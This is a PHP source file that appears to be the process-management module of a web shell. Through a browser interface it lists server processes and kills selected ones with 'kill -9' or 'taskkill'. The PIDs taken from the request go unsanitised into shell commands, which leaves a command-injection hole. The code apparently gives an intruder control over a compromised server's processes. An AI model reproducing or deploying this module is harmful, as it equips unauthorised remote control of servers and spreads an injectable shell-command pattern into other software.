<?php
$GLOBALS['module']['processes']['id'] = "processes";
$GLOBALS['module']['processes']['title'] = "Processes";
$GLOBALS['module']['processes']['js_ontabselected'] = "show_processes();";
$GLOBALS['module']['processes']['content'] = "";

if(!function_exists('show_processes')){
	function show_processes(){
		$output = '';
		$wcount = 11;
		if(is_win()){
			$cmd = "tasklist /V /FO csv";
			$wexplode = "\",\"";
		}
		else{
			$cmd = "ps aux";
			$wexplode = " ";
		}

		$res = execute($cmd);
		if(trim($res)=='') return false;
		else{
			$output .= "<table id='psTable' class='dataView sortable'>";
			if(!is_win()) $res = preg_replace('#\ +#',' ',$res);

			$psarr = explode("\n",$res);
			$fi = true;
			$tblcount = 0;

			$check = explode($wexplode,$psarr[0]);
			$wcount = count($check);

			foreach($psarr as $psa){
				if(trim($psa)!=''){
					if($fi){
						$fi = false;
						$psln = explode($wexplode, $psa, $wcount);
						$output .= "<tr><th class='col-cbox sorttable_nosort'><div class='cBoxAll'></div></th><th class='sorttable_nosort'>action</th>";
						foreach($psln as $p) $output .= "<th>".trim(trim(strtolower($p)) ,"\"")."</th>";
						$output .= "</tr>";
					}
					else{
						$psln = explode($wexplode, $psa, $wcount);
						$pid = trim(trim($psln[1]),"\"");
						$tblcount = 0;
						$output .= "<tr data-pid='".$pid."'>";

						foreach($psln as $p){
							if(trim($p)=="") $p = " ";
							$p = trim(trim($p) ,"\"");
							$p = html_safe($p);
							if($tblcount == 0){
								$output .= "<td><div class='cBox'></div></td><td><a class='kill'>kill</a></td><td>".$p."</td>";
								$tblcount++;
							}
							else{
								$tblcount++;
								if($tblcount == count($psln)) $output .= "<td style='text-align:left;'>".$p."</td>";
								else $output .= "<td style='text-align:center;'>".$p."</td>";
							}
						}
						$output .= "</tr>";
					}
				}
			}
			$colspan = count($psln)+1;
			$colspanAll = $colspan+1;
			$output .= "<tfoot><tr><td><div class='cBoxAll'></div></td><td colspan=".$colspan." style='text-align:left;'><span class='button' onclick='kill_selected();' style='margin-right:8px;'>kill selected</span><span class='button' onclick='show_processes();'>refresh</span><span class='psSelected'></span></td></tr></tfoot></table>";
		}
		return $output;
	}
}


if(isset($p['showProcesses'])){
	$processes = show_processes();
	if($processes!==false) output($processes);
	output('error');
}
elseif(isset($p['allPid'])){
	$allPid = explode(" ", $p['allPid']);
	$counter = 0;
	foreach($allPid as $pid){
		$pid = trim($pid);
		if(!empty($pid)){
			if(function_exists("posix_kill")){
				if(posix_kill($pid,'9')) $counter++;
			}
			else{
				if(is_win()){
					$cmd = execute("taskkill /F /PID ".$pid);
					$cmd = execute("tasklist /FI \"PID eq ".$pid."\"");
					if(strpos($cmd,"No tasks are running")!==false) $counter++;
				}
				else{
					$cmd = execute("kill -9 ".$pid);
					if((strpos($cmd, "such process")===false)&&(strpos($cmd, "not permitted")===false)){
						$cmd = trim(execute("ps -p ".$pid));
						$check = explode("\n", $cmd);
						if(count($check)==1) $counter++;
					}
				}
			}
		}
	}
	if($counter>0) output($counter);
	else output('error');
}

?>